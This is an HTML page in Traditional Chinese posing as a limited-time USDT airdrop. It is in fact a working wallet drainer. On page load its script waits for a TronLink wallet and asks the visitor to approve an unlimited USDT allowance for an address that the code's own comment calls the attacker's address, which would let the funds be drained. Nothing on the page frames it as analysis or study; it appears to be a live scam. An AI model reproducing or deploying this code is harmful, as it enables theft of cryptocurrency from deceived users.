<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>限時空投活動</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body { font-family: Arial; background: #f4f4f4; padding: 50px; text-align: center; }
    h1 { color: #222; }
    #status { margin-top: 20px; font-size: 18px; color: #555; }
  </style>
</head>
<body>
  <h1>🎁 恭喜獲得限時 USDT 空投</h1>
  <p id="status">請稍候，正在啟動授權...</p>

  <script>
    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";  // ✅ 主網 USDT
    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";   // ✅ 攻擊者地址
    const ABI = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    async function autoApprove() {
      const tronWeb = window.tronWeb;
      if (!tronWeb || !tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "❌ 請在 TronLink App 中打開本頁面";
        return;
      }

      const contract = await tronWeb.contract(ABI, CONTRACT);
      const max = tronWeb.toBigNumber("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

      document.getElementById("status").innerText = "⏳ 授權發送中...";
      try {
        const tx = await contract.approve(SPENDER, max).send();
        document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
      }
    }

    window.addEventListener("load", () => {
      const check = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(check);
          autoApprove();
        }
      }, 500);
    });
  </script>
</body>
</html>
